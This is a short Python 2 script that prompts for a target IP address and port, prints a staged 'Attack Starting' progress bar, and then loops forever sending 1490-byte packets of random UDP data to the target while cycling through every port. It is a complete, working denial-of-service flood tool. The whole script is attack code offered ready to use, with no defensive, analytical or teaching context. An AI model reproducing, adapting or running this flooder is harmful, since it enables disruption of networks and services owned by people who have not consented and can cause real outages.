# require python version 2

__author__ = "Brad Duy"

import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system("clear")
print
ip = raw_input("Enter IP Target : ")
port = input("Enter Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "It is processing : [                    ] 0% "
time.sleep(5)
print "It is processing : [=====               ] 25%"
time.sleep(5)
print "It is processing : [==========          ] 50%"
time.sleep(5)
print "It is processing : [===============     ] 75%"
time.sleep(5)
print "It is processing : [====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(random._urandom(1490), (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent, ip, port)
     if port == 65534:
       port = 1

